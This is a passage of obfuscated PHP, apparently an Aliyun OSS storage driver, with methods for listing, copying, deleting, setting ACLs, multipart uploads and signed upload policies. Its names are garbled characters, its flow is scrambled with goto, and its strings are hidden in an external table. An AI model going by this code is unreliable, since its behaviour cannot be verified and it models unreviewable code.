$a¯Ö¬Á‰ƒ÷ = '', $B‹ÒÊ‡»¯Ã = 0) { goto c∏›¥™„‹Œ; e±∫·Ö¨¥∑: $cêù†‹ö–§ = $e†ºé∂£Ø÷[33]; $Aå¶∆Ñêãƒ = 1000; $dÑ™ÛÈëËÎ = $this->listItemCache === !1 ? !1 : !0; goto cÉÁ¢ô≈’¢; cÉÁ¢ô≈’¢: $dé˜Œ‹∏”Ü = $e∏¢ÌéËÈÕ = array(); while (!0) { check_abort(); $E√¯Û€Îúî = array($e†ºé∂£Ø÷[1299] => $a¯Ö¬Á‰ƒ÷, $e†ºé∂£Ø÷[1300] => $dä≥Àû‰√÷, $e†ºé∂£Ø÷[1301] => $Aå¶∆Ñêãƒ, $e†ºé∂£Ø÷[1302] => $cêù†‹ö–§); try { $cï’Ç◊√…≠ = $this->client->listObjects($this->bucket, $E√¯Û€Îúî); } catch (OSS\Core\OssException $A”ØÁﬂıé¯) { break; } $cêù†‹ö–§ = $cï’Ç◊√…≠->getNextMarker(); $Eçõ«¿£Ê∑ = $cï’Ç◊√…≠->getObjectList(); $bﬂçéÏá… = $cï’Ç◊√…≠->getPrefixList(); foreach ($Eçõ«¿£Ê∑ as $Aí√©È´ä…) { goto dèòº’àèÊ; dèòº’àèÊ: if ($Aí√©È´ä…->getKey() == $dä≥Àû‰√÷) { continue; } $Bíµé¨≈πÿ = $Aí√©È´ä…->getKey(); $e™‚°èå≠£ = $Aí√©È´ä…->getSize(); goto Fªﬁ™Ù∫åÓ; c¿µ∞≥òÿı: if ($dÑ™ÛÈëËÎ) { $this->cacheMethod($e†ºé∂£Ø÷[199], $Bíµé¨≈πÿ, $d‚á≈ãøçç); $this->cacheMethod($e†ºé∂£Ø÷[200], $Bíµé¨≈πÿ, array($e†ºé∂£Ø÷[78] => $e™‚°èå≠£, $e†ºé∂£Ø÷[1303] => $e™‚°èå≠£, $e†ºé∂£Ø÷[84] => strtotime($f ıÃˆê‹ß), $e†ºé∂£Ø÷[1304] => $f ıÃˆê‹ß)); } if ($d‚á≈ãøçç) { $dé˜Œ‹∏”Ü[] = $Bíµé¨≈πÿ; continue; } $e∏¢ÌéËÈÕ[] = $c ¡íÚá¢©; goto bë•Âïóúñ; Fªﬁ™Ù∫åÓ: $f ıÃˆê‹ß = $Aí√©È´ä…->getLastModified(); $c ¡íÚá¢© = $B‹ÒÊ‡»¯Ã ? array($e†ºé∂£Ø÷[28] => $Bíµé¨≈πÿ, $e†ºé∂£Ø÷[78] => $e™‚°èå≠£, $e†ºé∂£Ø÷[197] => strtotime($f ıÃˆê‹ß)) : $Bíµé¨≈πÿ; $d‚á≈ãøçç = $e™‚°èå≠£ == 0 && substr($Bíµé¨≈πÿ, strlen($Bíµé¨≈πÿ) - 1, 1) == $e†ºé∂£Ø÷[8] ? !0 : !1; goto c¿µ∞≥òÿı; bë•Âïóúñ: } foreach ($bﬂçéÏá… as $cêÖ›“—èÉ) { $dé˜Œ‹∏”Ü[] = $cêÖ›“—èÉ->getPrefix(); if ($dÑ™ÛÈëËÎ) { $this->cacheMethod($e†ºé∂£Ø÷[199], $Bíµé¨≈πÿ, !0); } } if ($cêù†‹ö–§ === $e†ºé∂£Ø÷[33]) { break; } } if ($dÑ™ÛÈëËÎ) { $this->cacheMethod($e†ºé∂£Ø÷[199], $a”òÓ∆ôæ∑, !0); } goto F‹âüù…ªΩ; F‹âüù…ªΩ: return array($e†ºé∂£Ø÷[75] => $dé˜Œ‹∏”Ü, $e†ºé∂£Ø÷[74] => $e∏¢ÌéËÈÕ); goto B∆◊ÒêêÁ; c∏›¥™„‹Œ: $e†ºé∂£Ø÷ =& $_SERVER[’ÿƒ†ïò]; $a”òÓ∆ôæ∑ = trim($a”òÓ∆ôæ∑, $e†ºé∂£Ø÷[8]); $dä≥Àû‰√÷ = empty($a”òÓ∆ôæ∑) && $a”òÓ∆ôæ∑ !== $e†ºé∂£Ø÷[191] ? $e†ºé∂£Ø÷[33] : $a”òÓ∆ôæ∑ . $e†ºé∂£Ø÷[8]; goto e±∫·Ö¨¥∑; B∆◊ÒêêÁ: } public function copyFile($BÉ·ñ≠óâË, $d˘–Á«ÀÓÉ) { $C›òπ—Ì™∑ = $this->size($BÉ·ñ≠óâË); if ($C›òπ—Ì™∑ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $BÉ·ñ≠óâË, $this->bucket, $this->pathEncode($d˘–Á«ÀÓÉ)); } catch (OSS\Core\OssException $fâûÂ–±π≤) { return !1; } return $this->getPathOuter($d˘–Á«ÀÓÉ); } $bå…Í¥çãâ = $this->multiCopyObject($BÉ·ñ≠óâË, $d˘–Á«ÀÓÉ, $C›òπ—Ì™∑); return $bå…Í¥çãâ ? $this->getPathOuter($d˘–Á«ÀÓÉ) : !1; } private function multiCopyObject($a◊äáÿïõ, $cÛ—ªÑòä˜, $BÏò—Ù¿π…) { $f“ÇÍç©˘¡ =& $_SERVER[’ÿƒ†ïò]; try { goto b„¿∂ﬁçÖµ; b„¿∂ﬁçÖµ: $Dó–ÌëÖÀ… = array(); if ($d£òã‘çµ = $this->hashMd5($a◊äáÿïõ)) { $Dó–ÌëÖÀ… = array(OSS\OssClient::OSS_HEADERS => array($f“ÇÍç©˘¡[1305] => $d£òã‘çµ)); } $D∂⁄íç¿ë≠ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($cÛ—ªÑòä˜), $Dó–ÌëÖÀ…); goto e¢Û¨•±Ñô; cåŸπ¯÷≥ç: $eù ÑÔ´ûä = 1024 * 1024 * 10; $e∑ƒÏ∆åªú = $this->client->generateMultiuploadParts($BÏò—Ù¿π…, $eù ÑÔ´ûä); foreach ($e∑ƒÏ∆åªú as $FÿûàßÕ¨µ => $B ∞ÑπÛÖ‰) { $dﬂ¬∆‰ÿ®ã = $AéòÛ…¡≤ñ + (int) $B ∞ÑπÛÖ‰[$f“ÇÍç©˘¡[1306]]; $AûÂ≤é‡€â = (int) $B ∞ÑπÛÖ‰[$f“ÇÍç©˘¡[335]] + $dﬂ¬∆‰ÿ®ã - 1; $DæÊúî¬èå = array($f“ÇÍç©˘¡[1307] => $dﬂ¬∆‰ÿ®ã, $f“ÇÍç©˘¡[1308] => $AûÂ≤é‡€â); $d˘éÒóˆ……[] = $this->client->uploadPartCopy($this->bucket, $a◊äáÿïõ, $this->bucket, $this->pathEncode($cÛ—ªÑòä˜), $E∑áÿƒ◊≠, $D∂⁄íç¿ë≠, $DæÊúî¬èå); $E∑áÿƒ◊≠ = $E∑áÿƒ◊≠ + 1; } goto DŸâ«ËﬂÚ”; DŸâ«ËﬂÚ”: $F⁄ªå¿”ë = array(); foreach ($d˘éÒóˆ…… as $FÿûàßÕ¨µ => $b‹æˆÇΩ≥Ø) { $F⁄ªå¿”ë[] = array($f“ÇÍç©˘¡[1309] => $FÿûàßÕ¨µ + 1, $f“ÇÍç©˘¡[1310] => $b‹æˆÇΩ≥Ø); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($cÛ—ªÑòä˜), $D∂⁄íç¿ë≠, $F⁄ªå¿”ë); goto A∞ì≤Ûæﬁª; e¢Û¨•±Ñô: $E∑áÿƒ◊≠ = 1; $AéòÛ…¡≤ñ = 0; $d˘éÒóˆ…… = array(); goto cåŸπ¯÷≥ç; A∞ì≤Ûæﬁª: } catch (OSS\Core\OssException $eπ≈ü˜Áı·) { return !1; } return !0; } public function moveFile($b€óÁçÌ”‚, $b≈ÜËÍ≈ÖÊ) { if ($this->copyFile($b€óÁçÌ”‚, $b≈ÜËÍ≈ÖÊ)) { $this->remove($b€óÁçÌ”‚); return $this->getPathOuter($b≈ÜËÍ≈ÖÊ); } return !1; } public function delFile($cóòü·ûÃ≠) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($cóòü·ûÃ≠)); } catch (OSS\Core\OssException $Eèë≤›È≈à) { return !1; } return !0; } public function delFolder($b¥°˘µÊí∏) { goto Aä∞§Æú√©; Aä∞§Æú√©: $dßœª´Éﬁ€ =& $_SERVER[’ÿƒ†ïò]; if (!$this->exist($b¥°˘µÊí∏)) { return !0; } $this->listItemCache = !1; goto A™Ú¨ß—Ç˜; eÉ’á¢Éí¯: $fË©√Ú£Ø≈ = $this->delByBatch($c¿†°âºÍÃ[$dßœª´Éﬁ€[75]]); if (!$fË©√Ú£Ø≈) { return !1; } return $this->delFile($B≈‡≥ËäÂ§); goto CçÓÑƒèÒ¯; bñ€ä˜Øë¯: if (!empty($b¥°˘µÊí∏) && $b¥°˘µÊí∏ !== $dßœª´Éﬁ€[191] && !in_array($B≈‡≥ËäÂ§, $c¿†°âºÍÃ[$dßœª´Éﬁ€[75]])) { $c¿†°âºÍÃ[$dßœª´Éﬁ€[75]][] = $B≈‡≥ËäÂ§; } $fË©√Ú£Ø≈ = $this->delByBatch($c¿†°âºÍÃ[$dßœª´Éﬁ€[74]]); if (!$fË©√Ú£Ø≈) { return !1; } goto eÉ’á¢Éí¯; A™Ú¨ß—Ç˜: $c¿†°âºÍÃ = $this->fileList($b¥°˘µÊí∏); $this->listItemCache = !0; $B≈‡≥ËäÂ§ = trim($b¥°˘µÊí∏, $dßœª´Éﬁ€[8]) . $dßœª´Éﬁ€[8]; goto bñ€ä˜Øë¯; CçÓÑƒèÒ¯: } private function delByBatch($c≈Ê‹ùº ≈) { foreach (array_chunk($c≈Ê‹ùº ≈, 1000) as $câˆ»‚≠∏Ÿ) { try { $this->client->deleteObjects($this->bucket, $câˆ»‚≠∏Ÿ); } catch (OSS\Core\OssException $Eêù¢÷Ñö¢) { return !1; } } return !0; } public function rename($eÎéÍÍÀú÷, $E°ﬁÇ˜≠’Ñ) { return $this->renameObject($eÎéÍÍÀú÷, $E°ﬁÇ˜≠’Ñ); } private function fileInfo($fÂÏæ•Á≠Ú, $e™ﬂò¨ªÿ∫ = false, $f´Á≤é›üæ = array()) { goto d¶£˘íƒàŒ; d¶£˘íƒàŒ: $E≤¢°Áå£É =& $_SERVER[’ÿƒ†ïò]; $f±Õö∞ˆÿ‹ = array($E≤¢°Áå£É[28] => $this->pathThis($fÂÏæ•Á≠Ú), $E≤¢°Áå£É[76] => $this->getPathOuter($fÂÏæ•Á≠Ú), $E≤¢°Áå£É[29] => $E≤¢°Áå£É[193], $E≤¢°Áå£É[78] => isset($f´Á≤é›üæ[$E≤¢°Áå£É[78]]) ? $f´Á≤é›üæ[$E≤¢°Áå£É[78]] : 0, $E≤¢°Áå£É[168] => $this->ext($fÂÏæ•Á≠Ú)); if ($e™ﬂò¨ªÿ∫) { return $f±Õö∞ˆÿ‹; } goto BÎ¥ëîåèï; c∫èÂœÑ≠: if (isset($f´Á≤é›üæ[$E≤¢°Áå£É[78]])) { $f±Õö∞ˆÿ‹[$E≤¢°Áå£É[78]] = $f´Á≤é›üæ[$E≤¢°Áå£É[78]]; } if (isset($f´Á≤é›üæ[$E≤¢°Áå£É[84]])) { $f±Õö∞ˆÿ‹[$E≤¢°Áå£É[84]] = $f´Á≤é›üæ[$E≤¢°Áå£É[84]]; } if (isset($f´Á≤é›üæ[$E≤¢°Áå£É[197]]) && !trim($f±Õö∞ˆÿ‹[$E≤¢°Áå£É[84]])) { $f±Õö∞ˆÿ‹[$E≤¢°Áå£É[84]] = $f´Á≤é›üæ[$E≤¢°Áå£É[197]]; } goto E√⁄áÔÚıË; E√⁄áÔÚıË: return $f±Õö∞ˆÿ‹; goto Dæ◊•ãΩßà; BÎ¥ëîåèï: $f±Õö∞ˆÿ‹[$E≤¢°Áå£É[194]] = $f±Õö∞ˆÿ‹[$E≤¢°Áå£É[84]] = 0; $f±Õö∞ˆÿ‹[$E≤¢°Áå£É[195]] = $f±Õö∞ˆÿ‹[$E≤¢°Áå£É[196]] = !0; if (empty($f´Á≤é›üæ)) { $dÙº≈©’»ñ = $this->objectMeta($fÂÏæ•Á≠Ú); if (!$dÙº≈©’»ñ) { return $f±Õö∞ˆÿ‹; } $f´Á≤é›üæ = array($E≤¢°Áå£É[84] => strtotime($dÙº≈©’»ñ[$E≤¢°Áå£É[1304]]), $E≤¢°Áå£É[78] => $dÙº≈©’»ñ[$E≤¢°Áå£É[1303]] + 0); } goto c∫èÂœÑ≠; Dæ◊•ãΩßà: } private function folderInfo($DÉõçÜã¯í, $b»‰ÓÀ÷ÖÑ = false, $FË«Â¥Í÷√ = array()) { goto BÎâŸıÉã∏; BÎâŸıÉã∏: $Cà≈ÈÙÚ¨√ =& $_SERVER[’ÿƒ†ïò]; $díÃà—à≥ü = array($Cà≈ÈÙÚ¨√[28] => $this->pathThis($DÉõçÜã¯í), $Cà≈ÈÙÚ¨√[76] => $this->getPathOuter($Cà≈ÈÙÚ¨√[8] . $DÉõçÜã¯í), $Cà≈ÈÙÚ¨√[29] => $Cà≈ÈÙÚ¨√[77]); if ($b»‰ÓÀ÷ÖÑ) { return $díÃà—à≥ü; } goto BÀŒÕß¨˘‡; BÀŒÕß¨˘‡: $díÃà—à≥ü[$Cà≈ÈÙÚ¨√[194]] = $díÃà—à≥ü[$Cà≈ÈÙÚ¨√[84]] = 0; $díÃà—à≥ü[$Cà≈ÈÙÚ¨√[195]] = $díÃà—à≥ü[$Cà≈ÈÙÚ¨√[196]] = !0; if (empty($FË«Â¥Í÷√)) { $DÉõçÜã¯í = rtrim($DÉõçÜã¯í, $Cà≈ÈÙÚ¨√[8]) . $Cà≈ÈÙÚ¨√[8]; $eÈ·È≈—ﬂã = $this->objectMeta($DÉõçÜã¯í); if (!$eÈ·È≈—ﬂã) { return $díÃà—à≥ü; } $FË«Â¥Í÷√ = array($Cà≈ÈÙÚ¨√[194] => $eÈ·È≈—ﬂã[$Cà≈ÈÙÚ¨√[505]][$Cà≈ÈÙÚ¨√[1311]], $Cà≈ÈÙÚ¨√[84] => strtotime($eÈ·È≈—ﬂã[$Cà≈ÈÙÚ¨√[1304]])); } goto A±◊àÛØ”™; A±◊àÛØ”™: if (isset($FË«Â¥Í÷√[$Cà≈ÈÙÚ¨√[84]])) { $díÃà—à≥ü[$Cà≈ÈÙÚ¨√[84]] = $FË«Â¥Í÷√[$Cà≈ÈÙÚ¨√[84]]; } if (isset($FË«Â¥Í÷√[$Cà≈ÈÙÚ¨√[194]])) { $díÃà—à≥ü[$Cà≈ÈÙÚ¨√[194]] = $FË«Â¥Í÷√[$Cà≈ÈÙÚ¨√[194]]; } return $díÃà—à≥ü; goto Aå»ÑØâ«¨; Aå»ÑØâ«¨: } public function listPath($aÏõáãåêé, $f—“Ë íåº = false) { $cÆË§÷Ñâ¶ =& $_SERVER[’ÿƒ†ïò]; $F∆êﬂŸ≠òà = $this->fileList($aÏõáãåêé, $cÆË§÷Ñâ¶[8], !0); foreach ($F∆êﬂŸ≠òà[$cÆË§÷Ñâ¶[75]] as $f∂Ò°’‚ŸÂ => $F¶åï‚¶©ñ) { $F∆êﬂŸ≠òà[$cÆË§÷Ñâ¶[75]][$f∂Ò°’‚ŸÂ] = $this->folderInfo($F¶åï‚¶©ñ, $f—“Ë íåº, $F¶åï‚¶©ñ); } foreach ($F∆êﬂŸ≠òà[$cÆË§÷Ñâ¶[74]] as $f∂Ò°’‚ŸÂ => $F¶åï‚¶©ñ) { $F∆êﬂŸ≠òà[$cÆË§÷Ñâ¶[74]][$f∂Ò°’‚ŸÂ] = $this->fileInfo($F¶åï‚¶©ñ[$cÆË§÷Ñâ¶[28]], $f—“Ë íåº, $F¶åï‚¶©ñ); } return $F∆êﬂŸ≠òà; } public function has($fÒ¯Üëô§, $eï”™‡äÜ◊ = false, $d›ñˆßâ¢ = true) { goto Fòô∆ÎÈ¶‡; Fòô∆ÎÈ¶‡: $AœíÎÜº›µ =& $_SERVER[’ÿƒ†ïò]; $fÒ¯Üëô§ = trim($fÒ¯Üëô§, $AœíÎÜº›µ[8]); $b–µ⁄ﬂ◊Ü· = empty($fÒ¯Üëô§) && $fÒ¯Üëô§ !== $AœíÎÜº›µ[191] ? $AœíÎÜº›µ[33] : $fÒ¯Üëô§ . $AœíÎÜº›µ[8]; goto aòÆ“∏¨≤; aòÆ“∏¨≤: $fü°±∞í¬Ç = $AœíÎÜº›µ[33]; $Aπ‚´πçˆÖ = 500; $D´áà¢öÀ– = $f≈€÷ìÛâ≤ = 0; goto e‰ÈÉùáëÊ; e‰ÈÉùáëÊ: while (!0) { check_abort(); $E®ñ©®¢œ„ = array($AœíÎÜº›µ[1299] => $AœíÎÜº›µ[8], $AœíÎÜº›µ[1300] => $b–µ⁄ﬂ◊Ü·, $AœíÎÜº›µ[1301] => $Aπ‚´πçˆÖ, $AœíÎÜº›µ[1302] => $fü°±∞í¬Ç); try { $B“›Ï–Àß® = $this->client->listObjects($this->bucket, $E®ñ©®¢œ„); } catch (OSS\Core\OssException $b∫∞ë‹ÉçØ) { break; } $fü°±∞í¬Ç = $B“›Ï–Àß®->getNextMarker(); $cö≥è°õÜ‚ = $B“›Ï–Àß®->getObjectList(); $B‡œïÌòÑÑ = $B“›Ï–Àß®->getPrefixList(); if ($eï”™‡äÜ◊) { if (count($cö≥è°õÜ‚) > 1 || count($cö≥è°õÜ‚) == 1 && $cö≥è°õÜ‚[0]->getKey() != $b–µ⁄ﬂ◊Ü·) { $D´áà¢öÀ– += count($cö≥è°õÜ‚) - 1; } if (!empty($B‡œïÌòÑÑ)) { $f≈€÷ìÛâ≤ += count($B‡œïÌòÑÑ); } if ($fü°±∞í¬Ç === $AœíÎÜº›µ[33]) { break; } continue; } if ($d›ñˆßâ¢) { if (!empty($cö≥è°õÜ‚)) { if (count($cö≥è°õÜ‚) > 1 || $cö≥è°õÜ‚[0]->getKey() != $b–µ⁄ﬂ◊Ü·) { return !0; } } } else { if (!empty($B‡œïÌòÑÑ)) { return !0; } } if ($fü°±∞í¬Ç === $AœíÎÜº›µ[33]) { break; } } if ($eï”™‡äÜ◊) { return array($AœíÎÜº›µ[203] => $D´áà¢öÀ–, $AœíÎÜº›µ[204] => $f≈€÷ìÛâ≤); } return !1; goto B¡ñÏ„√ﬂÌ; B¡ñÏ„√ﬂÌ: } public function listAll($Fˆ∆ãé± §) { $e◊´öÆï∆´ =& $_SERVER[’ÿƒ†ïò]; $bè¿á∆ÂÖ— = $this->fileList($Fˆ∆ãé± §, $e◊´öÆï∆´[33], !0); $CûŸÌ·ÜÉŒ = array(); foreach ($bè¿á∆ÂÖ—[$e◊´öÆï∆´[74]] as $CÒ„£÷°⁄â) { $CûŸÌ·ÜÉŒ[$CÒ„£÷°⁄â[$e◊´öÆï∆´[28]]] = $CÒ„£÷°⁄â[$e◊´öÆï∆´[78]]; } foreach ($bè¿á∆ÂÖ—[$e◊´öÆï∆´[75]] as $CÒ„£÷°⁄â) { if (is_string($CÒ„£÷°⁄â)) { $CûŸÌ·ÜÉŒ[$CÒ„£÷°⁄â] = 0; } } return $this->listAllFiles($Fˆ∆ãé± §, array_keys($CûŸÌ·ÜÉŒ), $CûŸÌ·ÜÉŒ); } public function canRead($Fæ·ß§îÆì) { $a¶∞∂◊¿«Ê =& $_SERVER[’ÿƒ†ïò]; $f©†Ûûé°’ = $this->pathAcl($Fæ·ß§îÆì); return $f©†Ûûé°’ == $a¶∞∂◊¿«Ê[1312] || $f©†Ûûé°’ == $a¶∞∂◊¿«Ê[544] ? !0 : !1; } public function canWrite($aÉ√†£≠°Ç) { $E—¨ò‚â√£ = $this->pathAcl($aÉ√†£≠°Ç); return $E—¨ò‚â√£ == $_SERVER[’ÿƒ†ïò][544] ? !0 : !1; } public function pathAcl($e†§ØíŸèæ) { goto b±ñŸ≤ëΩÌ; EÒÕÖÆ”ÃÈ: return $bÜ·ŒÜ¨¿◊; goto FƒÈΩ–Ü≠≈; b±ñŸ≤ëΩÌ: $fî®µ¢õû… =& $_SERVER[’ÿƒ†ïò]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $fÉû·ßüûÔ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($e†§ØíŸèæ)); } catch (OSS\Core\OssException $A√’‹§îöØ) { return !1; } goto b∂¶˜”Üë·; b∂¶˜”Üë·: $bÜ·ŒÜ¨¿◊ = $fÉû·ßüûÔ == $fî®µ¢õû…[34] ? $this->bucketAcl : $fÉû·ßüûÔ; if ($bÜ·ŒÜ¨¿◊ == $fî®µ¢õû…[1313]) { return $fî®µ¢õû…[1312]; } if ($bÜ·ŒÜ¨¿◊ == $fî®µ¢õû…[1314]) { return $fî®µ¢õû…[544]; } goto EÒÕÖÆ”ÃÈ; FƒÈΩ–Ü≠≈: } private function chmodPath($fÖÖƒ°ô◊ê, $bŸå∑¥ï¡Œ = '') { $DﬂÜÌ∑ΩäÑ =& $_SERVER[’ÿƒ†ïò]; $aè®úñÑÃè = empty($bŸå∑¥ï¡Œ) ? $DﬂÜÌ∑ΩäÑ[1314] : $bŸå∑¥ï¡Œ; $a—¥ßéê¶Ì = array($DﬂÜÌ∑ΩäÑ[34], $DﬂÜÌ∑ΩäÑ[192], $DﬂÜÌ∑ΩäÑ[1313], $DﬂÜÌ∑ΩäÑ[1314]); if (!in_array($aè®úñÑÃè, $a—¥ßéê¶Ì)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($fÖÖƒ°ô◊ê), $aè®úñÑÃè); } catch (OSS\Core\OssException $dåøîËƒ§‚) { return !1; } return !0; } public function getContent($d¿ˆê£ﬂ¶⁄) { return $this->fileSubstr($d¿ˆê£ﬂ¶⁄, -1); } public function setContent($e§Â‰ûäª◊, $c‚Û”êÎ≥é = '') { $E¨„ÌÖ€πç =& $_SERVER[’ÿƒ†ïò]; try { $cÃ∂®¬ÿ¨ÿ = $this->trafficLimit($E¨„ÌÖ€πç[1315]); $aú∫ÃÍñ©¢ = $this->client->putObject($this->bucket, $this->pathEncode($e§Â‰ûäª◊), $c‚Û”êÎ≥é, $cÃ∂®¬ÿ¨ÿ); } catch (OSS\Core\OssException $D…«ø§àÎß) { return !1; } $A¥ÿﬁÇÈâ‚ = array($E¨„ÌÖ€πç[1305] => trim($aú∫ÃÍñ©¢[$E¨„ÌÖ€πç[1316]], $E¨„ÌÖ€πç[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($e§Â‰ûäª◊))); $this->updateObjMeta($e§Â‰ûäª◊, $A¥ÿﬁÇÈâ‚); return isset($aú∫ÃÍñ©¢[$E¨„ÌÖ€πç[1317]][$E¨„ÌÖ€πç[1264]]) ? !0 : !1; } private function updateObjMeta($dÑúÕÓòÈ, $BË«´«›Á•) { $dÑúÕÓòÈ = $this->pathEncode($dÑúÕÓòÈ); try { $C◊ËÂ—Úú• = array(OSS\OssClient::OSS_HEADERS => $BË«´«›Á•); $this->client->copyObject($this->bucket, $dÑúÕÓòÈ, $this->bucket, $dÑúÕÓòÈ, $C◊ËÂ—Úú•); } catch (OSS\Core\OssException $c‚é¢èÕ”°) { return !1; } return !0; } public function upload($e¶´±ƒ¶èˆ, $dÚƒ¿öòÜ†, $CÉò‡êæã… = false, $Aä˜ô⁄≈Â’ = REPEAT_REPLACE) { $f™µÑ¥íÒ« =& $_SERVER[’ÿƒ†ïò]; $dÀ¥Ë…‘ú = trim($e¶´±ƒ¶èˆ, $f™µÑ¥íÒ«[8]); $e≤Óπ˜Àÿá = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($f™µÑ¥íÒ«[1305] => @md5_file($dÚƒ¿öòÜ†)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($e¶´±ƒ¶èˆ))); $e≤Óπ˜Àÿá = $this->trafficLimit($f™µÑ¥íÒ«[1315], $e≤Óπ˜Àÿá); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($dÀ¥Ë…‘ú), $dÚƒ¿öòÜ†, $e≤Óπ˜Àÿá); } catch (OSS\Core\OssException $F∏ú÷ëπçô) { return !1; } return $this->getPathOuter($e¶´±ƒ¶èˆ); } public function getHost() { $E≈‚ÈˆÍ”å =& $_SERVER[’ÿƒ†ïò]; $c≤é¢Éë—„ = explode($E≈‚ÈˆÍ”å[177], parent::getHost()); return $c≤é¢Éë—„[0] . $E≈‚ÈˆÍ”å[177] . $this->bucket . $E≈‚ÈˆÍ”å[95] . $c≤é¢Éë—„[1]; } public function uploadFormData($fÏ…§µâŒŸ, $FôÖ“≈ïäÑ = 3600) { goto cè°˘Øæüá; Dµ‹€¿‡˘Ö: $c˜ﬁ≥ëü≠≤ = $this->pathFather($fÏ…§µâŒŸ); $B≠¡ŸÒ⁄±€ = array($B∏«ÖÒ∂öë[1219] => $bÙª¿ÓÈ∞π, $B∏«ÖÒ∂öë[1220] => array(array($B∏«ÖÒ∂öë[1320], 0, $fºÎÇø¶∫ê), array($B∏«ÖÒ∂öë[1223], $B∏«ÖÒ∂öë[1224], $c˜ﬁ≥ëü≠≤))); $Bºä˘“–æ≠ = base64_encode(json_encode($B≠¡ŸÒ⁄±€)); goto B§©˘ƒùì“; D•àñêèªÍ: $e‚ù¡ùı¬è = date($B∏«ÖÒ∂öë[1318], time() + $d√Ü¯Í®∏Ì); $DãÏÒ”ﬁúò = new DateTime($e‚ù¡ùı¬è); $bÙª¿ÓÈ∞π = $DãÏÒ”ﬁúò->format(DateTime::ISO8601); goto C¢©ãóÜµã; cè°˘Øæüá: $B∏«ÖÒ∂öë =& $_SERVER[’ÿƒ†ïò]; if (!($D¨«ò’˘‡ª = $this->getHost())) { return !1; } $d√Ü¯Í®∏Ì = $FôÖ“≈ïäÑ; goto D•àñêèªÍ; C¢©ãóÜµã: $BºÜòßµπé = strpos($bÙª¿ÓÈ∞π, $B∏«ÖÒ∂öë[294]); $bÙª¿ÓÈ∞π = substr($bÙª¿ÓÈ∞π, 0, $BºÜòßµπé) . $B∏«ÖÒ∂öë[1319]; $fºÎÇø¶∫ê = 1048576000 * 5; goto Dµ‹€¿‡˘Ö; dâíö·∑œ≥: return $e⁄ÿåÁ¡Œ›; goto cÓ¨°µæ‚â; B§©˘ƒùì“: $B≤·éœÑâÛ = base64_encode(hash_hmac($B∏«ÖÒ∂öë[230], $Bºä˘“–æ≠, $this->secret, !0)); $e⁄ÿåÁ¡Œ› = array($B∏«ÖÒ∂öë[1229] => $Bºä˘“–æ≠, $B∏«ÖÒ∂öë[1321] => $this->accessKey, $B∏«ÖÒ∂öë[1225] => $B∏«ÖÒ∂öë[1217], $B∏«ÖÒ∂öë[1322] => $B≤·éœÑâÛ, $B∏«ÖÒ∂öë[175] => $D¨«ò’˘‡ª); $e⁄ÿåÁ¡Œ› = $this->trafficLimit($B∏«ÖÒ∂öë[1315], $e⁄ÿåÁ¡Œ›); goto dâíö·∑œ≥; cÓ¨°µæ‚â: } public function multiUploadFormData($E≥˘èêëÓÁ, $c¬—êÍ◊¬û = 3600) { $d‘Éàëÿë– =& $_SERVER[’ÿƒ†ïò]; if (!($aúò∑äÖÚ√ = $this->getHost())) { return !1; } $bïÜÍ÷®„â = $this->trafficLimit($d‘Éàëÿë–[1315]); $C∆‰¨Œ∫©ø = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($E≥˘èêëÓÁ), $bïÜÍ÷®„â); return array($d‘Éàëÿë–[221] => $C∆‰¨Œ∫©ø, $d‘Éàëÿë–[175] => $aúò∑äÖÚ√ . $d‘Éàëÿë–[8] . $this->pathEncode($E≥˘èêëÓÁ), $d‘Éàëÿë–[222] => gmdate($d‘Éàëÿë–[1323]), $d‘Éàëÿë–[93] => $E≥˘èêëÓÁ); } public function multiUploadAuthData($D¨…ˆ≥ÌÉﬁ, $B»øáÖ±Ã¶ = array()) { goto AÔ˘É‘ê»; AÔ˘É‘ê»: $eëÒ™îäÇÌ =& $_SERVER[’ÿƒ†ïò]; $C∏≤∆Ç◊Ñù = isset($B»øáÖ±Ã¶[$eëÒ™îäÇÌ[222]]) ? $B»øáÖ±Ã¶[$eëÒ™îäÇÌ[222]] : gmdate($eëÒ™îäÇÌ[1323]); $eÕ®∏Ò…Ÿá = isset($B»øáÖ±Ã¶[$eëÒ™îäÇÌ[168]]) ? $B»øáÖ±Ã¶[$eëÒ™îäÇÌ[168]] : $eëÒ™îäÇÌ[33]; goto bôô√…îî≤; bôô√…îî≤: $bÑ»—¡Àã— = $D¨…ˆ≥ÌÉﬁ; if (isset($B»øáÖ±Ã¶[$eëÒ™îäÇÌ[93]])) { $bÑ»—¡Àã— = $B»øáÖ±Ã¶[$eëÒ™îäÇÌ[93]]; unset($B»øáÖ±Ã¶[$eëÒ™îäÇÌ[93]]); } if (isset($B»øáÖ±Ã¶[$eëÒ™îäÇÌ[223]])) { $B»øáÖ±Ã¶[$eëÒ™îäÇÌ[222]] = $C∏≤∆Ç◊Ñù; return $this->listUploadParts($bÑ»—¡Àã—, $B»øáÖ±Ã¶); } goto F¿√âªÈÚ—; F¿√âªÈÚ—: $c¶ëÉµû — = array($eëÒ™îäÇÌ[224], $eëÒ™îäÇÌ[33], $eëÒ™îäÇÌ[119], $C∏≤∆Ç◊Ñù, "\x78\55\x6f\x73\x73\55\144\x61\x74\x65\72{$C∏≤∆Ç◊Ñù}", $eëÒ™îäÇÌ[8] . $this->bucket . $eëÒ™îäÇÌ[8] . $bÑ»—¡Àã— . $eÕ®∏Ò…Ÿá); if (strpos($eÕ®∏Ò…Ÿá, $eëÒ™îäÇÌ[225]) === 0) { $c¶ëÉµû —[0] = $eëÒ™îäÇÌ[226]; if ($cÂÎÙâ®•Ç = $this->trafficLimit($eëÒ™îäÇÌ[1315])) { $bÑ»—¡Àã— = $eëÒ™îäÇÌ[1324]; array_splice($c¶ëÉµû —, 5, 0, $bÑ»—¡Àã— . 